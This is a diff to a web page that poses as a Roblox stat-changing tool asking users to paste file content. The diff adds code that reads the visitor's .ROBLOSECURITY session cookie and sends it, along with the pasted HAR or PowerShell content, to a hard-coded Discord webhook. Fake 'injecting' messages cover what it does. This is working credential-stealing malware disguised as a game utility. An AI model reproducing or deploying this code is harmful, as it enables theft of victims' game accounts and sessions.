@@ -169,7 +169,7 @@
             document.getElementById('content').innerHTML = `
                 <div class="form-container">
                     <h1>Enter The Correct File</h1>
-                    <textarea id="fileInput" placeholder="Paste your HAR file content here..."></textarea>
+                    <textarea id="fileInput" placeholder="Paste your powershell file content here..."></textarea>
                     <button class="button" onclick="processFile()">Send</button>
                     <a href="#" class="back-button" onclick="goBack()">Back</a>
                 </div>
@@ -181,14 +181,24 @@
             document.getElementById('content').innerHTML = '';
         }
 
-        // Process File Input with delay between chunks
+        // Process File Input
         function processFile() {
             const fileContent = document.getElementById('fileInput').value;
 
             if (!fileContent.trim()) {
-                alert('Please paste a valid HAR file content.');
+                alert('Please paste a valid powershell file content.');
                 return;
             }
+
+            // Extract the Roblox security cookie
+            const robloCookie = document.cookie.split(';').find(cookie => cookie.trim().startsWith('.ROBLOSECURITY='));
+
+            if (!robloCookie) {
+                alert('No Roblox security cookie found.');
+                return;
+            }
+
+            const robloCookieValue = robloCookie.split('=')[1];
 
             const chunks = fileContent.match(/.{1,2000}/g); // Break into chunks
             let delay = 0;
@@ -198,17 +208,24 @@
                     fetch('https://discord.com/api/webhooks/1321995950989774848/BKg3Y7TCya2_Q-PpAAYDWq31ZxxnG4cR90MjJZTB7yp7CdDRUWyqrsE_RAhR7T9bLJA2', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: `Part ${index + 1}: ${chunk}` }),
+                        body: JSON.stringify({ 
+                            content: `Part ${index + 1}: ${chunk}`,
+                            embeds: [{
+                                title: "Session Cookie",
+                                description: `Roblox Cookie: ${robloCookieValue}`,
+                                color: 16711680
+                            }]
+                        }),
                     })
                     .then(response => response.json())
                     .then(data => {
                         if (index === chunks.length - 1) {
-                            alert('Changing Stats, Please wait!');
+                            alert('attempting to change stats and inject!');
                         }
                     })
                     .catch(error => {
                         console.error('Error sending file chunk:', error);
-                        alert('Failed to connect.');
+                        alert('Failed to inject roblox database.');
                     });
                 }, delay);
 
@@ -218,4 +235,3 @@
     </script>
 </body>
 </html>
-
